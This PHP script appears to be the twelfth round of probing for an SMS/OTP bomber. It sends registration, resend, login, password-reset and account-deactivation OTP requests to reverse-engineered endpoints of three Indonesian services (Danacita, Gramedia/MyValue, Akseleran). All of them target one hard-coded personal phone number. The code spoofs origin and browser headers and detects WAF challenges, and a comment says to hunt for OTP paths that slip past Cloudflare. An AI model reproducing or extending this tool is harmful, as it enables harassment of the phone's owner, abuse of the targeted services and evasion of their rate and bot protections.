<?php
// Ronde 12: endpoint hasil RE Danacita (atlas auth OTP) + Gramedia/MyValue + probe lanjutan
$UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36';
$L = '083822461998'; $N = '83822461998'; $P = '6283822461998'; $R = random_int(100000, 999999);

function req($method, $url, $body, $extra = [], $UA = 'x') {
  $UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36';
  $ch = curl_init();
  $h = array_merge(['Accept: application/json, text/plain, */*', 'Content-Type: application/json'], $extra,
    ['User-Agent: ' . $UA, 'Accept-Language: id,en;q=0.9']);
  curl_setopt_array($ch, [CURLOPT_URL => $url, CURLOPT_HTTPHEADER => $h, CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CONNECTTIMEOUT => 10, CURLOPT_TIMEOUT => 30, CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_ENCODING => '', CURLOPT_CUSTOMREQUEST => $method]);
  if ($method !== 'GET') curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
  $r = (string) curl_exec($ch); $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
  $err = curl_error($ch); curl_close($ch);
  $f = trim(preg_replace('/\s+/', ' ', $r));
  if (stripos($f, 'Just a moment') !== false) $f = 'WAF challenge';
  elseif (preg_match('/<title>(.*?)<\/title>/is', $f, $m)) $f = 'html title=' . trim($m[1]);
  return sprintf("[%-3s] %s", $code ?: '000', $err !== '' ? 'GAGAL: ' . $err : ($f !== '' ? substr($f, 0, 200) : '(kosong)'));
}

$D = ['Origin: https://app.danacita.co.id', 'Referer: https://app.danacita.co.id/', 'Authorization: '];
$DC = 'https://app.danacita.co.id/api/atlas/v1/auth/';

$T = [
  ['danacita-otp-1', 'POST', $DC . 'registration-otp-request', '{"username":"' . $L . '"}', $D],
  ['danacita-otp-2', 'POST', $DC . 'registration-otp-request', '{"username":"' . $P . '","notif_channel_mode":"sms","is_white_label":false}', $D],
  ['danacita-otp-3', 'POST', $DC . 'registration-otp-request', '{"username":"' . $N . '","recaptcha":"","notif_channel_mode":"wa","is_white_label":false}', $D],
  ['danacita-resend', 'POST', $DC . 'registration-otp-resend', '{"username":"' . $L . '"}', $D],
  ['danacita-tokentr', 'GET', 'https://app.danacita.co.id/api/atlas/v1/auth/token/', '', $D],
  ['danacita-old', 'GET', 'https://api.danacita.co.id/users/send_otp/?mobile_phone=' . $N, '', []],

  // gramedia / myvalue
  ['gram-root', 'GET', 'https://api-accounts.gramedia.com/', '', []],
  ['gram-otp', 'POST', 'https://api-accounts.gramedia.com/api/v1/otp', '{"phone":"' . $L . '"}',
    ['Origin: https://accounts.gramedia.com', 'Referer: https://accounts.gramedia.com/']],
  ['gram-login', 'POST', 'https://api-accounts.gramedia.com/api/v1/login', '{"phone":"' . $L . '"}',
    ['Origin: https://accounts.gramedia.com', 'Referer: https://accounts.gramedia.com/']],

  // akseleran: /api/v1/* kena Cloudflare, auth/* lolos. Cari jalur OTP non-apiv1 yang lolos
  ['aksel-otp-alt', 'POST', 'https://api.akseleran.co.id/users/otp/request', '{"phone_number":"' . $L . '"}',
    ['Origin: https://www.akseleran.co.id', 'Referer: https://www.akseleran.co.id/']],
  ['aksel-deact', 'POST', 'https://api.akseleran.co.id/users/deactivate/otp/request', '{"phone_number":"' . $L . '"}', []],
  ['aksel-forgot', 'POST', 'https://api.akseleran.co.id/auth/forgot-password', '{"phone_number":"' . $L . '"}', []],
];

foreach ($T as [$n, $m, $u, $b, $h]) {
  printf("%-16s %s\n", $n, req($m, $u, $b, $h));
  usleep(250000);
}
echo "\n";
